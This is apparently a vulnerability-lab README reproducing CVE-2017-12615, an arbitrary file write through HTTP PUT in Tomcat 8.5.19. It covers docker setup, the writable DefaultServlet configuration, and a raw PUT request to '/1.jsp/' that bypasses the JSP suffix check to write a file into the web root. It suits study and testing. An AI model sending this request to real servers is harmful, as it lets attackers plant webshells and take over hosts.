# Tomcat PUT method arbitrary write file vulnerability (CVE-2017-12615)

Tomcat version: 8.5.19

## Environment Building

```
Docker-compose build
Docker-compose up -d
```

After running, visit `http://your-ip:8080` to see the Tomcat Example page.

## Vulnerability Principle

reference:

- http://wooyun.jozxing.cc/static/bugs/wooyun-2015-0107097.html
- https://mp.weixin.qq.com/s?__biz=MzI1NDg4MTIxMw==&mid=2247483659&idx=1&sn=c23b3a3b3b43d70999bdbe644e79f7e5
- https://mp.weixin.qq.com/s?__biz=MzU3ODAyMjg4OQ==&mid=2247483805&idx=1&sn=503a3e29165d57d3c20ced671761bb5e

The nature of the vulnerability Tomcat is configured to be writable (readonly=false), which allows us to write files to the server:

```
<servlet>
    <servlet-name>default</servlet-name>
    <servlet-class>org.apache.catalina.servlets.DefaultServlet</servlet-class>
    <init-param>
        <param-name>debug</param-name>
        <param-value>0</param-value>
    </init-param>
    <init-param>
        <param-name>listings</param-name>
        <param-value>false</param-value>
    </init-param>
    <init-param>
        <param-name>readonly</param-name>
        <param-value>false</param-value>
    </init-param>
    <load-on-startup>1</load-on-startup>
</servlet>
```

Although Tomcat has some detection of file suffixes (you can't write jsp directly), we use some file system features (such as `/` available under Linux) to bypass the restrictions.

## Vulnerability recurrence

You can write the shell to the web root directly by sending the following packet:

```
PUT /1.jsp/ HTTP/1.1
Host: your-ip:8080
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

Shell
```

as follows:

![](01.png)